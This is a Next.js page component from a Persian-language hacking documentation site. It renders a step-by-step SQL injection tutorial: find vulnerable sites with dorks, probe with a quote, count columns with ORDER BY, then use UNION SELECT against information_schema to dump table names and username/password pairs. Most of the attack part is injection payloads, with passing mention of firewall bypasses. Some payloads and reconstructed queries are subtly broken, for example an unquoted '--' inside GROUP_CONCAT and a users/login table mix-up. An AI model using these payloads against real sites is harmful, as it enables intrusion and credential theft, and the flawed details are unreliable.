/** @format */

import { Code, Step, Bold } from '@/app/Components/common'
import { LI, UL } from '@/app/Components/List'
import { PageLayout } from '@/app/Components/PageLayout/page-layout'
import Image from 'next/image'
import Post1Image from '@/app/assets/images/post-1.png'
import Post2Image from '@/app/assets/images/post-2.png'
import Post3Image from '@/app/assets/images/post-3.png'

const url = 'https://test.com/post.php?id=10'
const url2 = 'https://test.com/post.php?id=-10'

const SqlInjection = () => {
  return (
    <PageLayout
      title='SQL Injection'
      breadcrumb={[
        { title: 'فهرست مستندات', href: '/' },
        { title: 'هک و امنیت', href: '/security' },
        { title: 'کلوپ ۱', href: '/security/club-1' }
      ]}>
      <UL title='مراحل انجام کار'>
        <LI title='۱'>پیدا کردن سایت آسیب پذیر از طریق dork</LI>
        <LI title='۲'>تزریق دستورات به دیتابیس برای پیدا کردن تعداد ستون های کوئری</LI>
        <LI title='۳'>استفاده از دستور UNION SELECT برای اتصال اطلاعات جدوال دیتابیس به خروجی کوئری</LI>
        <LI title='۴'>اعمال bypass های مختلف برای دور زدن پالیسی های فایروال، وب سرور و... در صورت دریافت خطا</LI>
        <LI title='۵'>نمایش اطلاعات مهم نظیر یوزرنیم و پسورد و... روی سایت</LI>
      </UL>
      <UL title='شروع کار'>
        <FirstStep />
        <SecondStep />
        <ThirdStep />
      </UL>
    </PageLayout>
  )
}
export default SqlInjection

const FirstStep = () => {
  return (
    <LI simple={false} title='مرحله ۱'>
      <Step type='GOAL'>تزریق کاراکتر مخرب (کوتیشن) به کوئری و سعی در ایجاد خطا در نتیجه کوئری.</Step>
      <Step type='METHOD'>
        <p>با قرار دادن کاراکتر تک کوتیشتن در انتهای url کار را شروع می کنیم.</p>
        <Code>{`${url}'`}</Code>
      </Step>

      <Step type='DESCRIPTION'>
        تزریق کوتیشن در کوئری باعث ایجاد خطای سینتکسی در بک اند می شود. با انجام این کار و دریافت خطا اطمینان حاصل می
        کنیم که دیتای ارسالی از طریق کاربر (در اینجا id) بدون فیلتر شدن وارد دستورات کوئری می شود.
      </Step>

      <Step type='RESULT'>
        در صورتی که تعداد آیتم های نمایش داده شده در سایت تغییر کند، یا خطایی روی صفحه مشاهده شود و یا بصورت کلی در
        صورتی که با اضافه کردن کوتیشن به انتهای url تغییری در نوع نمایش صفحه نسبت به حالت بدون کوتیشن مشاهده شود احتمال
        وجود آسیب پذیری SQL Injection وجود دارد .
      </Step>

      <Step type='QUERY'>
        <Code>1) Before Quate: $query = 'SELECT id, name, category_id from posts WHERE id = 10' </Code>
        <Code>2) After Quate: $query = 'SELECT id, name, category_id from posts WHERE id = 10''</Code>

        <p>
          در حالت دوم قرار گرفتن دو کوتیشن پشت سر یکدیگر باعث بروز خطای سینتکسی و تغییر نتیجه کوئری می شود‌(در صورت وجود
          آسیب پذیری SQL Injection)
        </p>
      </Step>
    </LI>
  )
}

const SecondStep = () => {
  return (
    <LI simple={false} title='مرحله ۲'>
      <Step type='GOAL'>پیدا کردن تعداد ستون های موجود در کوئری</Step>
      <Step type='METHOD'>
        <p>در این مرحله اولین دستوری که تست میکنیم به صورت زیر می باشد:</p>
        <Code>{url} order by 159951159--</Code>
      </Step>
      <Step type='DESCRIPTION'>
        در این مرحله سعی می کنیم با استفاده از دستور order by متوجه شویم که چه تعداد ستون در کوئری وجود دارد. این موضوع
        از این نظر اهمیت دارد که در مراحل بعدی برای تزریق دستور UNION SELECT حتما باید مقدار دقیق تعداد ستون ها را داشته
        باشیم.
        <ul className='m-2'>
          <li>
            <Bold>۱-</Bold> معنی
            <Bold>order by 159951159</Bold>
            این است که کوئری را بر اساس
            <Bold>159951159 مین ستون</Bold>
            مرتب کنیم.
          </li>
          <li>
            <Bold>۲-</Bold> مقدار <Bold>159951159</Bold>
            یک مقدار دلخواه است که باید عدد
            <Bold>بزرگی</Bold>
            باشد. پیشنهاد می شود از اعداد <Bold>بیشتر از چهار رقم</Bold> استفاده شود.
          </li>
          <li>
            <Bold>۳-</Bold> مقدار <Bold>--</Bold>در انتهای دستور برای <Bold>کامنت کردن</Bold> ادامه ی کوئری اصلی می
            باشد. با این کار اطمینان حاصل می کنیم که دستوراتی که در ادامه کوئری اصلی وجود دارد باعث ایجاد مشکل یا تداخل
            با مقداری که تزریق کرده ایم نمی شود. بخش تحلیل کوئری شامل توضیحات فنی این بخش می باشد.
          </li>
        </ul>
      </Step>

      <Step type='RESULT'>
        <p>
          دیتابیس سعی می کند خروجی را بر اساس 159951159 ستون مرتب سازی کند و عملا ستون 159951159 ام وجود ندارد، چون
          تعداد ستون های جداول دیتابیس بصورت حدودی تا 4096 می باشد. در دنیای واقعی احتمال وجود جدولی با تعداد ستون بیش
          از ۱۰۰ تا بسیار محدود می باشد. به هر حال عددی که ما انتخاب می کنیم مطمئنا سقف مجاز تعداد ستون های موجود در
          جدوال دیتابیس را رد می کند که منجر به بروز خطا در دیتابیس می شود.
        </p>
        <p>
          انجام این کار می تواند نتایجی مانند
          <Bold>نمایش خطای دیتابیسی،</Bold>
          <Bold>عدم لود شدن دیتا</Bold>و یا بصورت کلی
          <Bold>تغییر در نتیجه ی کوئری و به طبع آن تغییر در نمایش اطلاعات سایت</Bold>
          داشته باشد.
        </p>
        <Bold>
          توجه کنید که برخی اوقات تزریق این دستور باعث ایجاد هیچ یک از موارد ذکر شده نمی گردد، که در صورت بروز این اتفاق
          از دستور زیر استفاده می کنیم:
        </Bold>
        <Code>{`${url}'`} order by 159951159--+</Code>
        یعنی اضافه کردن کوتیشن بعد از پارامتر و همچنین اضافه کردن علامت <Bold>+</Bold> در انتهای کوئری. چرایی این موضوع
        و توضیح کوئری در بخش تحلیل کوئری آورده شده است.
        <p>
          بعد از اطمینان از تغییر رفتار کوئری، باید با تغییر مقدار 159951159 سعی در پیدا کردن تعداد ستون های موجود در
          کوئری کنیم. برای این کار به نمونه تزریق های زیر دقت کنید:
          <Code>1) {url} order by 10--</Code>
          <Code>2) {url} order by 9--</Code>
          <Code>3) {url} order by 8--</Code>
          <Code>4) {url} order by 7--</Code>
          <Code>5) {url} order by 6--</Code>
        </p>
        <Bold>
          <span className='text-red-600 text-lg'>
            تعداد ستون های کوئری برابر است با بزرگترین عدد بعد از order by که اطلاعات سایت را بدون تغییر یا بروز خطا
            نمایش دهد .
          </span>
        </Bold>
        <p>
          توجه داشته باشید که برای پیدا کردن بزرگترین عددی که اطلاعات را بدون خطا یا تغییر نمایش دهد باید اعداد مختلف را
          تست کنیم. در مثال بالا اعداد ۱۰ و ۹ و ۸ و ۷ و ۶ بصورت مثال آورده شده است.
        </p>
        <p>با فرض اینکه جواب عدد ۷ باشد سناریو را پیش می بریم.</p>
      </Step>

      <Step type='QUERY'>
        برای آدرس
        <Code>{url}</Code>
        کوئری ای مشابه
        <Code>SELECT id, name, category_id from posts WHERE id = 10 another sql statements...</Code>
        در سمت بک اند اجرا می شود که منظور از <Bold>another sql statements</Bold> دستورات شرطی، مرتب سازی، گروه بندی
        و... ای است که ممکن است در ادامه ی کوئری وجود داشته باشد.
        <p>با تزریق order by 159951159-- به دیتابیس، کوئری از حالت قبل به حالت زیر تغییر می کند.</p>
        <Code>
          1) After Injection: SELECT id, name, category_id from posts WHERE id = 10 ORDER BY 159951159-- another sql
          statements...
        </Code>
        <Code>2) Result: SELECT id, name, category_id from posts WHERE id = 10 ORDER BY 159951159</Code>
        <p>در مرحله قبل با فرض اینکه عدد ۷ تعداد ستون های موجود در کوئری باشد، کوئری نهایی این بخش بصورت </p>
        <Code>SELECT id, name, category_id from posts WHERE id = 10 ORDER BY 7</Code>
        با تزریق
        <Code>{url} order by 7--</Code>
        یا
        <Code>{`${url}' order by 7--+`}</Code>
        می باشد.
      </Step>
    </LI>
  )
}

const ThirdStep = () => {
  return (
    <LI simple={false} title='مرحله ۳'>
      <Step type='GOAL'>اتصال اطلاعات جدوال دیتابیس به خروجی کوئری جهت نمایش در سایت</Step>
      <Step type='DESCRIPTION'>
        در این مرحله قصد داریم اطلاعات اضافه ای را به کوئری اصلی بچسبانیم تا همراه آن در سایت نمایش داده شود. برای این
        کار از دستور
        <Bold>union select</Bold> استفاده می شود که شرط کار کردن آن برابر بودن تعداد ستون های کوئری اصلی با تعداد ستون
        های موجود در union select است.
        <p>
          برای درک بهتر، موضوع را با یک سناریو پیش می بریم. فرض کنیم آدرس زیر
          <Code>{url}</Code>
          اطلاعات یه پست را در صفحه ی وب سایت نمایش می دهد. این اطلاعات شامل عنوان پست، متن پست، تصویر پست، تاریخ انتشار
          پست می باشد. مشابه تصویر شماتیک زیر:
        </p>
        <Image alt='post-1' width={500} height={500} src={Post1Image} className='mr-auto' />
        <p>حال آدرس زیر را فراخوانی می کنیم:</p>
        <Code>{`${url2}' union select 1,2,3,4,5,6,7--+`}</Code>
        <p>فرضا با تصویری مشابه زیر در وبسایت مواجه می شویم:</p>
        <Image alt='post-2' width={500} height={500} src={Post2Image} className='mr-auto' />
        <ul className='m-2'>
          <li>
            <Bold>۱-</Bold>
            این آدرس اطلاعات پست مورد نظر را به همراه یک رکورد اضافه با مقادیر ۱ تا ۷ را در وب سایت نمایش می دهد. که
            البته با قرار دادن مقدار <Bold>-</Bold> اطلاعات پست اصلی را حذف کرده ایم.
          </li>
          <li>
            <Bold>۲-</Bold>
            قرار دادن مقدار <Bold>-</Bold> قبل از <Bold>10</Bold> در کوئری صرفا این دلیل است که با وارد کردن یک مقدار
            نامعتبر مانع لود شدن دیتای اصلی کوئری شویم تا فقط مقدار حاصل از union select در وب سایت نمایش داده شود. چون
            مقدار id معمولا از ۱ شروع می شود در نتیجه مقادیر منفی نامعتبر هستند. لازم به ذکر است مقادیر نامعتبر دیگری
            مانند صفر، رشته و... هم می تواند جایگزین مقدار id شود ولی قرار دادن <Bold>-</Bold> هم ساده تر است هم مطمئن
            تر.
          </li>
          <li>
            <Bold>۳-</Bold>
            علت حذف اطلاعات اصلی کوئری صرفا جهت خلوت تر شدن وبسایت برای پیدا کردن اعداد union select در صفحه است.
          </li>
          <li>
            <Bold>۴-</Bold>
            اطلاعاتی که از تصویر دوم استخراج می شود به این صورت است که از ۷ ستون موجود در کوئری، ستون های ۳ و ۵ و ۱ و ۲
            در وبسایت نمایش داده می شوند. لزوما قرار نیست تمام ستون ها را مشاهده کنیم. برای مثال ممکن است ستونی تحت
            عنوان منتشر کننده پست نیز در کوئری وجود داشته باشد که به هر دلیلی در وبسایت نمایش داده نشده است. وجود یک
            ستون برای ادامه ی کار کافی است.
          </li>
          <li>
            <Bold>۵-</Bold>
            در union select مقدار مقادیر اهمیتی ندارد. بلکه تعداد آن مهم است. فرضا اگر آدرس زیر
            <Code>{`${url2}' union select 75,12,0,458,16,32,5--+`}</Code>
            را فراخوانی کنیم، با تصویر زیر مواجه می شویم:
            <Image alt='post-3' width={500} height={500} src={Post3Image} className='mr-auto' />
          </li>
        </ul>
        <p>
          اکنون می توانیم مقادیر موجود در union select را با دستورات SQL جایگزین کنیم و بجای مقادیر ۱ تا ۷، اطلاعاتی
          نظیر نام دیتابیس، ورژن دیتابیس، نام جدوال و... را نمایش دهیم.
        </p>
        <ul>
          <li>
            <Code>GROUP_CONCAT(username,--,password) {'==>'} username1--password1, username2--password2, ...</Code>
          </li>
          <li>
            <Code>information_schema.tables {'==>'} List of tables</Code>
          </li>
          <li>
            <Code>
              information_schema.tables WHERE table_schema = database() {'==>'} List of tables in current database
            </Code>
          </li>
          <li>
            <Code>
              information_schema.columns WHERE table_name = hex of users {'==>'} List of columns in users table
            </Code>
          </li>
        </ul>
      </Step>
      <Step type='METHOD'>
        در این مرحله ابتدا لیست جداول دیتابیس را واکشی می کنیم و در یکی از ستون های قابل مشاهده در وبسایت قرار می دهیم:
        <Code>
          {url2} union select 1,2,group_concat(table_name),4,5,6,7 from information_schema.tables where
          table_schema=database()--
        </Code>
        یا
        <Code>{`${url2}' union select 1,2,group_concat(table_name),4,5,6,7 from information_schema.tables where table_schema=database()--+`}</Code>
        <p>
          در این مرحله با پیدا کردن جداول مهم یا هر جدولی که اطلاعات آن را لازم داریم، اقدام به پیدا کردن ستون های آن
          جدول می کنیم. فرضا جدول مورد نظر ما users نام دارد. با دستور زیر لیست ستون های جدول users را واکشی می کنیم و
          در یکی از ستون های قابل مشاهده در وبسایت قرار می دهیم:
        </p>
        <Code>
          {url2} union select 1,2,group_concat(column_name),4,5,6,7 from information_schema.columns where table_name=hex
          value of users--
        </Code>
        یا
        <Code>{`${url2}' union select 1,2,group_concat(column_name),4,5,6,7 from information_schema.columns where table_name=hex value of users--+`}</Code>
        <p>
          دقت داشته باشید مقدار <Bold>table_name</Bold> باید مقدار <Bold>hex</Bold> نام جدول باشد
        </p>
        <p>
          با فرض اینکه لیست ستون ها بصورت id, name, email, username, password باشد، با دستور زیر اطلاعات سطر ها را واکشی
          می کنیم و در یکی از ستون های قابل مشاهده در وبسایت قرار می دهیم:
        </p>
        <Code>{url2} union select 1,2,group_concat(username,--,password),4,5,6,7 from login--</Code>
        یا
        <Code>{`${url2}' union select 1,2,group_concat(username,--,password),4,5,6,7 from login--+`}</Code>
      </Step>
      <Step type='QUERY'>
        <div>
          برای آدرس
          <Code>
            {url2} union select 1,2,group_concat(table_name),4,5,6,7 from information_schema.tables where
            table_schema=database()--
          </Code>
          کوئری ای مشابه
          <Code>
            $query = SELECT id, title, body, image, publish_date, publisher_name, created_at UNION SELECT 1, 2,
            GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()
          </Code>
          در سمت بک اند اجرا می شود.
        </div>
        <hr />
        <div>
          برای آدرس
          <Code>{url2} union select 1,2,group_concat(username,--,password),4,5,6,7 from login--</Code>
          کوئری ای مشابه
          <Code>
            $query = SELECT id, title, body, image, publish_date, publisher_name, created_at UNION SELECT 1, 2,
            GROUP_CONCAT(username,--,password) FROM login
          </Code>
          در سمت بک اند اجرا می شود.
        </div>
        <p>
          علت استفاده از <Bold>GROUP_CONCAT</Bold> به این دلیل است که بتوانیم لیست تمام ستون ها، جدول ها و کلا هر
          اطلاعاتی که تعداد آن را نمی دانیم را بصورت یک رشته با جدا کننده ی کاما در یک ستون قابل مشاهده در وبسایت نمایش
          دهیم. مثلا در حالت عادی دستور <Bold>table_name</Bold> یا <Bold>column_name</Bold> به ترتیب <Bold>لیستی</Bold>
          از رکورد شامل نام جدول ها و نام ستون ها را واکشی می کند که در حالت عادی قابل نمایش در یک ستون قابل مشاهده در
          وبسایت را نیستند. دستور <Bold>GROUP_CONCAT</Bold> خروجی را از حالت <Bold>لیست</Bold> به حالت <Bold>رشته</Bold>
          در می آورد که به راحتی قابل نمایش در یک ستون قابل مشاهده در وبسایت است.
        </p>
      </Step>
    </LI>
  )
}
